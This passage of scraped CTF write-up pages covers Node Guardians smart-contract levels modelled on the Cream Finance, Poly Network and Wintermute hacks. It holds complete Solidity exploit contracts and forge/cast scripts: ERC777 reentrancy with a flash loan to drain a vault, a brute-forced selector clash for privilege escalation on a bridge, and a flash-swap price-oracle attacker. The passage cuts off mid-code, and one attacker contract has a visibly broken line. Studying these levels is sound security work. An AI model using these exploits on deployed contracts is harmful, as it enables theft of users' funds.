address INSTANCE = vm.envAddress(\"INSTANCE\"); vm.startBroadcast(deployerPrivateKey); SharkVault vault = SharkVault(INSTANCE); IERC20 gold = IERC20(vault.gold()); IERC20 seagold = IERC20(vault.seagold()); console.logAddress(address(gold)); // logs the gold token address console.logAddress(address(seagold)); // logs the seagold token address console.logUint(gold.balanceOf(address(vault))); // logs the amount gold in the vault console.logUint(seagold.balanceOf(address(vault))); // logs the amount of seagold in the vault vm.stopBroadcast(); } } which gives me the following output :\nSo there are 3000000000000000000000 unit of $Seagold in the contract to be stolen !\nNow here is the vault contract code :\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.19; import \"@openzeppelin/contracts/interfaces/IERC20.sol\"; contract SharkVault { // The Shark charges predatory interest rates... uint256 constant public INTEREST_RATE_PERCENT = 1; IERC20 immutable public gold; IERC20 immutable public seagold; struct LoanAccount { uint256 depositedGold; uint256 borrowedSeagold; uint256 lastBlock; } mapping(address =\u003e LoanAccount) private accounts; constructor( IERC20 _gold, IERC20 _seagold ) { gold = _gold; seagold = _seagold; } /** * @notice Deposit gold as collateral. * @param _amount Amount of gold to deposit. * @dev Gold must be approved for transfer beforehand. */ function depositGold(uint256 _amount) external payable { accounts[msg.sender].depositedGold += _amount; gold.transferFrom(msg.sender, address(this), _amount); } /** * @notice Withdraw gold collateral. * @param _amount Amount of gold to withdraw. * @dev Any existing seagold loan must still be * sufficiently collateralized. */ function withdrawGold(uint256 _amount) external payable { LoanAccount memory account = updatedAccount(msg.sender); account.depositedGold -= _amount; require(_hasEnoughCollateral(account), \"Undercollateralized $SEAGLD loan\"); accounts[msg.sender] = account; gold.transfer(msg.sender, _amount); } /** * @notice Borrow seagold. * @param _amount Amount of seagold to borrow. * @dev Seagold loan have be suffciently collateralized * by previously deposited gold. */ function borrow(uint256 _amount) external { LoanAccount memory borrowerAccount = updatedAccount(msg.sender); borrowerAccount.borrowedSeagold += _amount; // Fail if insufficient remaining balance of $SEAGOLD uint256 seagoldBalance = seagold.balanceOf(address(this)); require(_amount \u003c= seagoldBalance, \"Insufficient $SEAGLD to lend\"); // Fail if borrower has insufficient gold collateral require(_hasEnoughCollateral(borrowerAccount), \"Undercollateralized $SEAGLD loan\"); // Transfer $SEAGOLD and update records seagold.transfer(msg.sender, _amount); accounts[msg.sender] = borrowerAccount; } /** * @notice Repay borrowed seagold. * @param _amount Amount of seagold to repay. * @dev Seagold must be approved for transfer beforehand. */ function repay(uint256 _amount) external { LoanAccount memory account = updatedAccount(msg.sender); account.borrowedSeagold -= _amount; accounts[msg.sender] = account; seagold.transferFrom(msg.sender, address(this), _amount); } /** * @notice Liquidate an existing undercollateralized loan. * The smart contract effectively seizes the gold collateral. * @param _borrower Owner of the loan. */ function liquidate(address _borrower) external { LoanAccount memory borrowerAccount = updatedAccount(_borrower); require(!_hasEnoughCollateral(borrowerAccount), \"Borrower has good collateral\"); delete accounts[_borrower]; } /** * @notice Get the loan account of a user, with updated interest. * @param _accountOwner Owner of the loan. */ function updatedAccount( address _accountOwner ) public view returns (LoanAccount memory account) { account = accounts[_accountOwner]; if (account.borrowedSeagold \u003e 0) { uint256 blockDelta = block.number - account.lastBlock; uint256 interest = account.borrowedSeagold * blockDelta * INTEREST_RATE_PERCENT / 100; account.depositedGold = (account.depositedGold \u003e= interest) ? account.depositedGold - interest : 0; } account.lastBlock = block.number; } /** * @dev Returns true if `_account` is sufficiently collateralized by gold. * Collateral ratio =\u003e 1 GOLD : 0.75 SEAGOLD */ function _hasEnoughCollateral(LoanAccount memory _account) private pure returns (bool) { return (3 * _account.depositedGold \u003e= 4 * _account.borrowedSeagold); } } From reding the Cream Finance post moterm, we can easily suppose that their is a reentrancy vulnerability inside this contract so I‚Äôm looking for any miss ordered [Checks ‚Üí Effects ‚Üí Interactions] pattern in the contract.\nYou can find nice description of this pattern inside the solidity documentation:\nIn other word, we want to find something in the contract that update the internal state of the contract after talking with the outside world.\nAnd here we have it :\nfunction borrow(uint256 _amount) external { LoanAccount memory borrowerAccount = updatedAccount(msg.sender); // local state borrowerAccount.borrowedSeagold += _amount; // local state // Fail if insufficient remaining balance of $SEAGOLD uint256 seagoldBalance = seagold.balanceOf(address(this)); // local state require(_amount \u003c= seagoldBalance, \"Insufficient $SEAGLD to lend\"); // 1st Check // Fail if borrower has insufficient gold collateral require(_hasEnoughCollateral(borrowerAccount), \"Undercollateralized $SEAGLD loan\"); // 2d Check //--- DANGER ZONE ---// // Transfer $SEAGOLD and update records seagold.transfer(msg.sender, _amount); // Interaction (outside world communication) accounts[msg.sender] = borrowerAccount; // Effect (internal state change) } Those last two line are very dangerous since transfer can be done to any malicious contract that will recall the borrow function before the accounnts[msg.sender] state is updated, breaking the internal state logic of the contract !\nThe first line of the method calls updatedAccount here you have the code of this method :\nfunction updatedAccount( address _accountOwner ) public view returns (LoanAccount memory account) { // we can't rely on this value // since borrow can be called multiple times (recursion pattern) // before it updates the accounts account = accounts[_accountOwner]; if (account.borrowedSeagold \u003e 0) { uint256 blockDelta = block.number - account.lastBlock; uint256 interest = account.borrowedSeagold * blockDelta * INTEREST_RATE_PERCENT / 100; account.depositedGold = (account.depositedGold \u003e= interest) ? account.depositedGold - interest : 0; } account.lastBlock = block.number; } but this call presuppose that account = accounts[_accountOwner]; is the correct value, which we know is wrong since we can call borrow as many time as we want without changing the accounts[msg.sender] .\nNow, we know there is a vulnerability inside the Sharkvault contract. In order to interact with the borrow method, we first need to deposit some $Gold collateral into it. Don‚Äôt forget that we have access to another contract: the flash lender !\nLet‚Äôs see how many $Gold we can get from the flash loan:\nSo, 1 000 Gold token.\nAnd we want to still 3 000 SeaGold.\nIt is said that : For every 1000 Gold deposited, users can borrow up to 75 Seagold.\nSo we‚Äôll be able to borrow 750 Seagold on each call which is perfet since 3 000 / 750 = 4 !\nSo, here are the step I‚Äôm going to implement;\nAsk for a flash loan of 1000 Gold to the falsh lender Deposit the 1000 Gold from the Flashloan contract into the SharkVault contract Make a borrow() of 0 SeaGold so I don‚Äôt have to repay anything at the end of the call call Call borrow() 750 SeaGold x4 thanks to the contract breach Withdraw the 1000 Gold from the SharkVault contract and repay back the Flashloan contract Here is another point of view from a contract state perspective:\nyou can play with the animation here\nimage\nNow it still remains one problem, how to take advantage of the Seagold transfer method ?\nWe can take a look at the decompiled version of the function from goerliscan :\ndef transfer(address _to, uint256 _value) payable: require calldata.size - 4 \u003e=Œì√á‚ñì 64 require _to == _to require _value == _value if not caller: revert with 0, 'ERC777: transfer from the zero address' if not _to: revert with 0, 'ERC777: transfer to the zero address' static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with: gas gas_remaining wei args caller, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895 if not ext_call.success: revert with ext_call.return_data[0 len return_data.size] require return_data.size \u003e=Œì√á‚ñì 32 require ext_call.return_data == ext_call.return_data[12 len 20] if ext_call.return_data[12 len 20]: require ext_code.size(addr(ext_call.return_data)) call addr(ext_call.return_data).tokensToSend(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with: gas gas_remaining wei args caller, caller, addr(_to), _value, 192, 224, 0, 0 if not ext_call.success: revert with ext_call.return_data[0 len return_data.size] if balanceOf[caller] \u003c _value: revert with 0, 'ERC777: transfer amount exceeds balance' balanceOf[caller] -= _value if balanceOf[addr(_to)] \u003e balanceOf[addr(_to)] + _value: revert with 'NH{q', 17 balanceOf[addr(_to)] += _value log Sent(address operator, address from, address to, uint256 amount, bytes holderData, bytes operatorData): _value, 96, 128, 0, 0, caller, caller, _to, log Transfer( address from=_value, address to=caller, uint256 tokens=_to) static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with: gas gas_remaining wei args addr(_to), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b if not ext_call.success: revert with ext_call.return_data[0 len return_data.size] require return_data.size \u003e=Œì√á‚ñì 32 require ext_call.return_data == ext_call.return_data[12 len 20] if ext_call.return_data[12 len 20]: require ext_code.size(addr(ext_call.return_data)) call addr(ext_call.return_data).tokensReceived(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with: gas gas_remaining wei args caller, caller, addr(_to), _value, 192, 224, 0, 0 if not ext_call.success: revert with ext_call.return_data[0 len return_data.size] return 1 and the first transaction log from my first POC (see further below) we can see that their is some call to getInterfaceImplementer() function:\nHere is the correponding eip : https://eips.ethereum.org/EIPS/eip-1820\nBack to the decompiled code:\nstatic call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with: gas gas_remaining wei args addr(_to), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b after a quick google search we can find that:\nbookmark\nSo apparently, Seagold is not just an ERC20 but rather an ERC777\nThe question is: How can we trigger a fallback like functionality from ERC777 transfer call ?\nhttps://ethereum.stackexchange.com/a/84702\nHere we have it :\nbookmark\nWe can clearly see here that if we implement the tokensReceived function we can have a re-entrancy attack:\nSo let‚Äôs implement the function in our flashloan contract + we can see that the address is called on the return data which is the _to address from the params of the function which is msg.sender which is our flash loan contract !\nOnce we have implemented the function there is still one thing to do:\nWe can see that there is no interface implementer registered, so there are no call that is made here :\nif ext_call.return_data[12 len 20]: require ext_code.size(addr(ext_call.return_data)) call addr(ext_call.return_data).tokensReceived(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with: gas gas_remaining wei args caller, caller, addr(_to), _value, 192, 224, 0, 0 ext_call.return_data is the result of getInterfaceImplementer.\nSo first we have to find a way to add an interface implementer in the ERC1830Registry.\nWe can do so with the following function:\n/// @notice Sets the contract which implements a specific interface for an address. /// Only the manager defined for that address can set it. /// (Each address is the manager for itself until it sets a new manager.) /// @param _addr Address for which to set the interface. /// (If '_addr' is the zero address then 'msg.sender' is assumed.) /// @param _interfaceHash Keccak256 hash of the name of the interface as a string. /// E.g., 'web3.utils.keccak256(\"ERC777TokensRecipient\")' for the 'ERC777TokensRecipient' interface. /// @param _implementer Contract address implementing '_interfaceHash' for '_addr'. function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external { address addr = _addr == address(0) ? msg.sender : _addr; require(getManager(addr) == msg.sender, \"Not the manager\"); require(!isERC165Interface(_interfaceHash), \"Must not be an ERC165 hash\"); if (_implementer != address(0) \u0026\u0026 _implementer != msg.sender) { require( ERC1820ImplementerInterface(_implementer) .canImplementInterfaceForAddress(_interfaceHash, addr) == ERC1820_ACCEPT_MAGIC, \"Does not implement the interface\" ); } interfaces[addr][_interfaceHash] = _implementer; emit InterfaceImplementerSet(addr, _interfaceHash, _implementer); } ‚Üí _addr (FlashLoan address)\n‚Üí _interfaceHash (0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b)\n‚Üí _interfaceHash (FlashLoan address)\nSo here is the call I make :\nERC1820Registry registry = ERC1820Registry(REGISTRY); registry.setInterfaceImplementer(address(flashLoan), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(flashLoan)); but I felt onto:\nQuestion: who is the manager ?\nIt turns out that a contract is its own manager ! hehe\nSo I moved my code inside my FlashLoan attacker üòà\nAnd here is a first peek at my set up:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.19; // Here we can find the standard interface for the ERC20. Don't forget that we find // out that the seagold is actually an ERC777 token ! interface IERC20 { event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address to, uint256 value) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transferFrom(address from, address to, uint256 value) external returns (bool); } // This is the registry that tells for a given contract which interface its supports // There is a getter and a setter. // The manager of a contrat is the contract itself by default. interface ERC1820Registry { function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address); function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external; } // This is the vault we are going to attack interface SharkVault { // The Shark charges predatory interest rates... function INTEREST_RATE_PERCENT() external returns(uint256); function gold() external returns(address); function seagold() external returns(address); struct LoanAccount { uint256 depositedGold; uint256 borrowedSeagold; uint256 lastBlock; } function depositGold(uint256 _amount) external ; function withdrawGold(uint256 _amount) external payable; function borrow(uint256 _amount) external; function repay(uint256 _amount) external; function liquidate(address _borrower) external; function updatedAccount( address _accountOwner ) external view returns (LoanAccount memory account); } // This is one of the interface of our attacker contract. // onFlashLoan will be called by the FlashLender (see the next interface) // when this function is called we actually have the gold token in the // attacker contract interface IERC3156FlashBorrower { function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata data ) external returns (bytes32); } // This one is the interface for the flash loan borrower. // This is where we find the initial golds that will boostrap the whole attack // and the ones that we have to repay at the end of the flashloan (+ fee) but there // is no fees in this scenario. interface IERC3156FlashLender { function maxFlashLoan( address token ) external view returns (uint256); function flashFee( address token, uint256 amount ) external view returns (uint256); function flashLoan( IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data ) external returns (bool); } // This is the second interface that our FlashLoan contract implement // It is basically where the re-entrancy attack begins ! interface IERC777TokensRecipient { function tokensReceived( address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData ) external; } // And there it is ! The FlashLoan attacker contract wich implements the whole // attack logic contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient { IERC20 gold; IERC20 seagold; IERC3156FlashLender flashLender; SharkVault vault; bool pwned; ERC1820Registry registry; // First, we get all the utilities we will need to access during the attack constructor(address _flashLender, address _gold, address _seagold, address _vault, address _registry) { gold = IERC20(_gold); seagold = IERC20(_seagold); flashLender = IERC3156FlashLender(_flashLender); vault = SharkVault(_vault); registry = ERC1820Registry(_registry); } // The attack is in two phases: // - 1) State that the contract implement the interface for the tokenReceived method // in the ERC1820 registry // - 2) Launch the actual attack starting with the flashloan on the Flash Lender contract function attack() public { registry.setInterfaceImplementer(address(0), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this)); uint maxAmount = flashLender.maxFlashLoan(address(gold)); flashLender.flashLoan(this, address(gold), maxAmount, abi.encode(0)); } // Once the loan is authorized by the Flash Lender it calls this function // on the our flash loan attacker contract function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata ) public returns (bytes32) { // Those are almost useless check require(initiator == address(this), 'Wrong initiator'); require(token == address(gold), 'Not gold'); require(fee == 0, 'Fee must be 0'); // First we deposit the gold token into the vault as collateral require(gold.approve(address(vault), amount)); vault.depositGold(amount); // Then we borrow some seagold // if everyting is fine the function to be called is tokenReceived down // bellow // The first borrow is intentionally of 0 since when we are going to // depop from the stack it's going to be the last value... So we'll // have nothing to repay in order to leave the shark vault :) vault.borrow(0 ether); // This is called only once the recursion is over // And it correspond to the withdrawing of the collateral from the // shark vault vault.withdrawGold(amount); // Finally we can approve the gold transfer in order to repay the initial // loan made to the Flash Lender ! require(gold.approve(address(flashLender), amount)); // And don't forget to return the expected hash: return keccak256(\"ERC3156FlashBorrower.onFlashLoan\"); } function tokensReceived( address, address, address, uint256 , bytes calldata, bytes calldata ) external { uint amount = seagold.balanceOf(address(vault)); // classic recursion pattern to prevent infinte loop if (amount == 0) { return; } // since there is 1000 ether of collateral 750 is the max amount we can borrow vault.borrow(750 ether); } } And here is the deployment script:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {SharkVault, IERC20, FlashLoan} from \"../src/Attack.sol\"; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address INSTANCE = vm.envAddress(\"INSTANCE\"); address FLASH_LENDER = vm.envAddress(\"FLASH_LENDER\"); address REGISTRY = vm.envAddress(\"ERC1820REGISTRY\"); vm.startBroadcast(deployerPrivateKey); SharkVault vault = SharkVault(INSTANCE); IERC20 gold = IERC20(vault.gold()); IERC20 seagold = IERC20(vault.seagold()); FlashLoan flashLoan = new FlashLoan(FLASH_LENDER, address(gold), address(seagold), address(vault), REGISTRY); console.logAddress(address(gold)); console.logAddress(address(seagold)); console.logUint(gold.balanceOf(address(vault))); console.logUint(seagold.balanceOf(address(vault))); flashLoan.attack(); console.logUint(seagold.balanceOf(address(vault))); vm.stopBroadcast(); } } forge script script/Shark.s.sol --rpc-url $GOERLI_RPC_URL -vvvv --broadcast --verify Refs:\nERC-3156: Flash Loans "},"title":"Cream Finance Rekt"},"/projects/node-guardians/poly-network-rekt-b7b8b11820c249bcb1f96a50fc20d478/":{"data":{"":"","poly-network#\u003cstrong\u003ePoly Network\u003c/strong\u003e":"","privilege-escalation-attack#\u003cstrong\u003ePrivilege Escalation Attack\u003c/strong\u003e":" First here the the boat address on Goerli (the target contract we have to interact with):\ncast call $TRADING_BOAT_GOERLI --rpc-url $RPC_URL_GOERLI \"tradingData()(address)\" \u003e 0xFDDa11C6504db2Cf760F3cb53253D88cF8A5a593 Now we can try to interact with the bridge contract on Fuji chain:\ncast send $TRADING_BOAT_FUJI --private-key $PRIVATE_KEY --rpc-url $RPC_URL_FUJI \"sendShipment(string,bytes32[],uint64,address)(bytes32)\" \"setTrademasters\" [0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6] 0x5 $TRADING_DATA_GOERLI output:\n0x97bc653aac2c7b476cefe65e9df32d34caf31f670e4f36a441000963f8df3a37 Now we can call the offchain trademaster to generate a signature:\nSignature: 0x265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c Let‚Äôs create a script to automate the process:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {TradingBoat} from '../contracts_/TradingBoat.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address PUBLIC_KEY = vm.envAddress(\"PUBLIC_KEY\"); address TRADING_BOAT_GOERLI = vm.envAddress(\"TRADING_BOAT_GOERLI\"); address TRADING_DATA_GOERLI = vm.envAddress(\"TRADING_DATA_GOERLI\"); vm.startBroadcast(deployerPrivateKey); TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI); bytes32[] memory params = new bytes32[](1); params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6; bytes memory signature = hex\"265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c\"; boat.relayShipment(\"setTrademasters\", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature); vm.stopBroadcast(); } } Now we can relay the message on the goerli chain using the following script:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {TradingBoat} from '../contracts_/TradingBoat.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address PUBLIC_KEY = vm.envAddress(\"PUBLIC_KEY\"); address TRADING_BOAT_GOERLI = vm.envAddress(\"TRADING_BOAT_GOERLI\"); address TRADING_DATA_GOERLI = vm.envAddress(\"TRADING_DATA_GOERLI\"); vm.startBroadcast(deployerPrivateKey); TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI); bytes32[] memory params = new bytes32[](1); params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6; bytes memory signature = hex\"265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c\"; boat.relayShipment(\"setTrademasters\", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature); vm.stopBroadcast(); } } without a surprise the contract revert :\nThis is because the relay function add some params (bytes32[],uint64,address) that we don‚Äôt need and that change the function selector resulting in calling the wrong method on the target contract:\nWe can see on the error message above that we call the selector 0x3b2e7145 whereas we were expecting to call 0xef51774d :\nNow we know that it‚Äôs pretty much straight forward what we have to do: brutforce the method params so that __abi.ecodePacked(_method, (bytes32[], uint64, address) result in the 0xef51774d selector.\nIn order to do that I installed the following program that seems to do the job:\nlink_preview\n\u003e docker run --rm power-clash -a bytes32[],uint64,address -s ef51774d -p setTrademasters \u003e Attempting to find setTrademasters******(bytes32[],uint64,address) match for 0xef51774d in 19770609664 max permutations \u003e Calculating 6277782.5 permutations per second \u003e Found match in 902.78942008s \u003e setTrademastersLMuGgO(bytes32[],uint64,address) hashes to 0xef51774d and Bingo! we have it : setTrademastersLMuGgO(bytes32[],uint64,address) hashes to 0xef51774d\nNow we can do the say process as before but using the new function name.\nHere is the signature we got:\nSignature: 0xeb8f7dc8da0fce482b52e20d85dc0f602c2932acea3170e3f4cea0a752855545505ac6ff2587c7d4d43b4936361832c4fd54c7a2a75d3f63efd23190f735f7771c fuji.s.sol\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {TradingBoat} from '../contracts_/TradingBoat.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address TRADING_BOAT_FUJI = vm.envAddress(\"TRADING_BOAT_FUJI\"); address TRADING_DATA_GOERLI = vm.envAddress(\"TRADING_DATA_GOERLI\"); vm.startBroadcast(deployerPrivateKey); TradingBoat boat = TradingBoat(TRADING_BOAT_FUJI); bytes32[] memory params = new bytes32[](1); params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6; bytes32 bridgeHash = boat.sendShipment(\"setTrademastersLMuGgO\", params, 5, TRADING_DATA_GOERLI); console.logBytes32(bridgeHash); vm.stopBroadcast(); } } goerli.s.sol\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {TradingBoat} from '../contracts_/TradingBoat.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address PUBLIC_KEY = vm.envAddress(\"PUBLIC_KEY\"); address TRADING_BOAT_GOERLI = vm.envAddress(\"TRADING_BOAT_GOERLI\"); address TRADING_DATA_GOERLI = vm.envAddress(\"TRADING_DATA_GOERLI\"); vm.startBroadcast(deployerPrivateKey); TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI); bytes32[] memory params = new bytes32[](1); params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6; bytes memory signature = hex\"eb8f7dc8da0fce482b52e20d85dc0f602c2932acea3170e3f4cea0a752855545505ac6ff2587c7d4d43b4936361832c4fd54c7a2a75d3f63efd23190f735f7771c\"; boat.relayShipment(\"setTrademastersLMuGgO\", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature); vm.stopBroadcast(); } } Poly Network Poly Network is a cross-chain protocol that facilitates cross-chain interaction between otherwise disconnected blockchains.\nPoly Network is more advanced than King Baku‚Äôs network. For instance, it uses merkle roots to batch cross-chain transactions, and a multi-signature scheme to improve decentralization.\nHowever similar to our¬†TradingBoat¬†contracts, Poly Network partitions its cross-chain contracts into 2 entities:\n1.¬†EthCrossChainManager¬†which handles the cross-chain verification and execution logic.\n2.¬†EthCrossChainData¬†which manages important information regarding cross-chain trademasters and calls.\nThe partition allows Poly Network to upgrade¬†EthCrossChainManager¬†via proxy, while asserting¬†EthCrossChainData¬†as immutable.\nPrivilege Escalation Attack The attack on¬†TradingBoat¬†and Poly Network is enabled by the same two underlying reasons.\nThe manager contract (TradingBoat/EthCrossChainManager) has access to some privileged external function (setTrademasters()/putCurEpochConPubKeyBytes()). The manager contract can call any function in any contract via selector clashing. Consequently, a malicious attack can search for a selector clash that forces the manager contract to call the privileged external function, and invoke unexpected effects.\nPoly Network has lost $611 million to this form of privilege escalation attack. Fortunately, the hacker has since return the stolen funds for a bug bounty reward."},"title":"Poly Network Rekt"},"/projects/node-guardians/price-oracle-attack-48bb5fd1fcf5428e84266833aecafe4f/":{"data":{"":" Deployment address : 0x1FD0357FcD623C5a1472B7C922CdB7aa262FaEC1\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.20; interface IUniswapV2Pair { function swap( uint amount0Out, uint amount1Out, address to, bytes calldata data ) external; function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast); } interface IUniswapV2Factory { function getPair( address tokenA, address tokenB ) external view returns (address pair); } interface IERC20 { function totalSupply() external view returns (uint); function balanceOf(address account) external view returns (uint); function transfer(address recipient, uint amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint); function approve(address spender, uint amount) external returns (bool); function transferFrom( address sender, address recipient, uint amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } interface IWETH is IERC20 { function deposit() external payable; function withdraw(uint amount) external; } interface IUniswapV2Callee { function uniswapV2Call( address sender, uint amount0, uint amount1, bytes calldata data ) external; } interface GoudaGobelin { function giveGouda() external; } contract Attacker is IUniswapV2Callee { address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; IERC20 private GOLD; IERC20 private GOUDA; GoudaGobelin instance; IUniswapV2Factory private factory = IUniswapV2Factory(UNISWAP_V2_FACTORY); IUniswapV2Pair private immutable pair; // For this example, store the amount to repay uint public amountToRepay; event Log(string message, uint val); constructor(address _gold, address _gouda, address exploited) { pair = IUniswapV2Pair(factory.getPair(address(_gouda), address(_gold))); GOLD = IERC20(_gold); GOUDA = IERC20(_gouda); instance = GoudaGobelin(exploited); } function getReserves() public view returns(uint112, uint112) { (uint112 r0, uint112 r1, ) = pair.getReserves(); return (r0, r1); } function getPair() public view returns(address) { return address(pair); } function flashSwap(uint goldAmount) external { // Need to pass some data to trigger uniswapV2Call bytes memory data = abi.encode(address(GOLD), address(this)); // amount0Out is Gouda, amount1Out is Gold pair.swap(goldAmount, 0, address(this), data); } // This function is called by the GOUDA/GOLD pair contract function uniswapV2Call( address sender, uint amount1, uint, bytes calldata data ) external { require(msg.sender == address(pair), \"not pair\"); require(sender == address(this), \"not sender\"); (address tokenBorrow) = abi.decode(data, (address)); // Your custom code would go here. For example, code to arbitrage. require(tokenBorrow == address(GOLD), \"token borrow != GOLD\"); uint fee = ((amount1 * 3) / 997) + 1; amountToRepay = amount1 + fee; uint goldBalance = GOLD.balanceOf(address(tokenBorrowpair)); uint goudaBalance = GOUDA.balanceOf(address(pair)); uint goudaPrice = goldBalance * 1 gwei / goudaBalance; uint ThisGoldBalance = GOLD.balanceOf(address(this)); uint ThisGoudaBalance = GOUDA.balanceOf(address(this)); emit Log(\"amount1\", amount1); emit Log(\"Pair goldBalance\", goldBalance); emit Log(\"Pair goudaBalance\", goudaBalance); emit Log(\"Pair goudaPrice\", goudaPrice); emit Log(\"This goudaBalance\", ThisGoudaBalance); emit Log(\"This goldBalance\", ThisGoldBalance); instance.giveGouda(); goldBalance = GOLD.balanceOf(address(pair)); goudaBalance = GOUDA.balanceOf(address(pair)); goudaPrice = goldBalance * 1 gwei / goudaBalance; ThisGoldBalance = GOLD.balanceOf(address(this)); ThisGoudaBalance = GOUDA.balanceOf(address(this)); emit Log(\"amount1\", amount1); emit Log(\"Pair goldBalance\", goldBalance); emit Log(\"Pair goudaBalance\", goudaBalance); emit Log(\"Pair goudaPrice\", goudaPrice); emit Log(\"This goudaBalance\", ThisGoudaBalance); emit Log(\"This goldBalance\", ThisGoldBalance); // Flashswap fees require(GOUDA.approve(address(pair), 1 ether), 'approve failed.'); GOUDA.transfer(address(pair), 10000000000000000000000); // Repay GOLD.transfer(address(pair), amount1); } } bookmark"},"title":"Price Oracle Attack"},"/projects/node-guardians/wintermute-rekt-d0fd4609147941e6af7fcc68ef81da6a/":{"data":{"":" Level: https://rekt.news/wintermute-rekt-2\nHere is the contract we have to break:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.19; contract UndeadHorde { address public constant LADY_WHITEFROST = 0x0DEaD582fa84de81e5287132d70d9a296224Cf90; bool public isActive = true; mapping(address =\u003e bool) public infested; function infestDead(address _target) external { require(isActive); require(_fromLady(), \"We only answer to our Queen Mother...\"); require(_isDead(_target), \"Target is still alive...\"); infested[_target] = true; } // So we have to find a way to call this function // The only possible way to do so is by being LADY_WHITEFROST // So we have to find the private key associated with her address function releaseArmy() external { require(_fromLady(), \"We only answer to our Queen Mother...\"); isActive = false; } function _fromLady() private view returns (bool) { return msg.sender == LADY_WHITEFROST; } function _isDead(address _target) private pure returns (bool) { uint160 prefix = uint160(_target) \u003e\u003e 140; return prefix == 0x0dead; } } First let‚Äôs take a look to the Vanity address generator that we have: find-more-dead.js\nconst { BigNumber } = require(\"ethers\"); const { arrayify, keccak256, zeroPad } = require(\"ethers/lib/utils\"); const { Worker } = require(\"worker_threads\"); const { CURVE } = require(\"@noble/secp256k1\"); const MAX_UINT16 = 65535; // 2**16 const NUM_OF_THREADS = 3; const K = \"0xc01ddeadc01ddeadc01ddead\"; // Generate a random private key `p` const seed = Math.floor(Math.random() * MAX_UINT16); // 1 out of 65535 possible seeds const privateKey = BigNumber.from(keccak256(seed)); // Determinitic private key generation console.log(`Seed: ${seed}`); // Start threads running `find-dead.js` for (let i = 0; i \u003c NUM_OF_THREADS; i++) { // Each thread is given a private key `p + (i * K)` const delta = BigNumber.from(K).mul(i); // ---- thread 0: privKey + delta0 // | // ---- 